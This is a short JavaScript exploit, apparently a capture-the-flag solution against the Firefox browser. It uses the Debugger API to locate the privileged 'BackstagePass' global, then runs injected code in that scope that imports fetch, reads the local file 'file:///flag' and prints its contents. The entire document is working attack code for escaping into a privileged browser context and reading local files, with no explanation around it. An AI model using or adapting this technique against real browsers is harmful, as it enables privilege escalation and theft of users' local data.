const debuggerObj = new Debugger();

let BackstagePass;
for (BackstagePass of debuggerObj.findAllGlobals()) {
  if (BackstagePass.class === 'BackstagePass') {
    break;
  }
}

BackstagePass.executeInGlobal(
  '(' +
    async function() {
      Cu.importGlobalProperties(['fetch']);

      const { inspect } = ChromeUtils.import('resource:///modules/ConsoleObserver.jsm');

      const response = await fetch('file:///flag');
      const data = await response.text();
      inspect(data, false, globalThis);
    } +
    ')()'
);
